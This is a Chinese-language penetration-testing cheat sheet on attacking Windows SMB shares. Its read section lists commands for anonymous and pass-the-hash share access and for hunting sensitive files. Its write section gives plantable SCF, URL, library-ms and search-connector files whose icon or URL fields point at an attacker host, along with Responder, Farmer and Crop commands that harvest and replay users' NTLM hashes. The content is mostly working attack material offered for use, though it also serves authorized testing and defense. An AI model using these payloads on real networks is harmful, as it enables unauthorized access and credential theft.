# 内网 - 共享 (Shares)

## 读权限 (READ Permission)

> 一些共享无需身份验证即可访问，探索它们以寻找一些有价值的 (juicy) 文件

* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec) - 网络执行工具 (The Network Execution Tool)

  ```ps1
  nxc smb 10.0.0.4 -u guest -p '' -M spider_plus
  nxc smb 10.0.0.4 -u guest -p '' --get-file \\info.txt.txt infos.txt.txt  --share OPENSHARE
  ```

* [ShawnDEvans/smbmap](https://github.com/ShawnDEvans/smbmap) - 一个便捷的 SMB 枚举工具

  ```powershell
  smbmap -H 10.10.10.10                # 空会话 (null session)
  smbmap -H 10.10.10.10 -r PATH        # 递归列出目录 (recursive listing)
  smbmap -H 10.10.10.10 -u invaliduser # guest smb 会话
  smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"
  ```

* [byt3bl33d3r/pth-smbclient](https://github.com/byt3bl33d3r/pth-toolkit) （来自 pth-toolkit）

  ```powershell
  pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
  pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
  ls  # 列出文件
  cd  # 进入文件夹
  get # 下载文件
  put # 替换文件
  ```

* [SecureAuthCorp/smbclient](https://github.com/SecureAuthCorp/impacket) （来自 Impacket）

  ```powershell
  smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
          Sharename       Type      Comment
          ---------       ----      -------
          ADMIN$          Disk      Remote Admin
          C$              Disk      Default share
          IPC$            IPC       Remote IPC
          NETLOGON        Disk      Logon server share
          Replication     Disk      
          SYSVOL          Disk      Logon server share
          Users           Disk
  use Sharename # 选择一个 Sharename
  cd Folder     # 进入文件夹
  ls            # 列出文件
  ```

* [smbclient](https://www.samba.org/samba/docs/4.9/man-html/smbclient.1.html) - 来自 Samba, 类似 ftp 客户端，用于访问服务器上的 SMB/CIFS 资源

  ```powershell
  smbclient -U username //10.0.0.1/SYSVOL
  smbclient //10.0.0.1/Share

  # 递归下载一个文件夹 (Download a folder recursively)
  smb: \> mask ""
  smb: \> recurse ON
  smb: \> prompt OFF
  smb: \> lcd '/path/to/go/'
  smb: \> mget *
  ```

* [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler) - 一个帮助渗透测试人员发现“美味糖果”(delicious candy，指敏感信息) 的工具

  ```ps1
  snaffler.exe -s - snaffler.log

  # 枚举域内的所有计算机
  ./Snaffler.exe -d domain.local -c <DC> -s

  # 枚举特定的计算机
  ./Snaffler.exe -n computer1,computer2 -s
  ​
  # 枚举特定的目录
  ./Snaffler.exe -i C:\ -s
  ```

## 写权限 (WRITE Permission)

在可写的共享中写入 SCF 和 URL 文件，以收集（farm）用户的哈希并在之后重放它们。

这些攻击可以使用 [Farmer.exe](https://github.com/mdsecactivebreach/Farmer) 和 [Crop.exe](https://github.com/mdsecactivebreach/Farmer/tree/main/crop) 来实现自动化。

```ps1
# 使用 Farmer 接收身份验证 (auth)
farmer.exe <port> [seconds] [output]
farmer.exe 8888 0 c:\windows\temp\test.tmp # 无限期运行 (undefinitely)
farmer.exe 8888 60 # 运行一分钟 (one minute)

# Crop 可用于创建各种文件类型，这些文件将触发 SMB/WebDAV 连接，以便在哈希收集攻击期间投毒文件共享
crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]
Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
```

### SCF 文件 (SCF Files)

将以下 `@something.scf` 文件放入共享中，并使用 Responder 开始监听：`responder -wrf --lm -v -I eth0`

```powershell
[Shell]
Command=2
IconFile=\\10.10.10.10\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

使用 [`netexec`](https://github.com/Pennyw0rth/NetExec/blob/master/cme/modules/slinky.py)：

```ps1
netexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
netexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk
netexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
```

### URL 文件 (URL Files)

此攻击同样适用于 `.url` 文件和 `responder -I eth0 -v` 命令。

```powershell
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.10.10.10\%USERNAME%.icon
IconIndex=1
```

### Windows 库文件 (Windows Library Files)

> Windows 库文件 (.library-ms)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\workstation@8888\\folder</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### Windows 搜索连接器文件 (Windows Search Connectors Files)

> Windows 搜索连接器 (.searchConnector-ms)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="<http://schemas.microsoft.com/windows/2009/searchConnector>">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>\\\\workstation@8888\\folder.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\\\workstation@8888\\folder</url>
    </simpleLocation>
</searchConnectorDescription>
```

## 参考资料 (References)

* [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
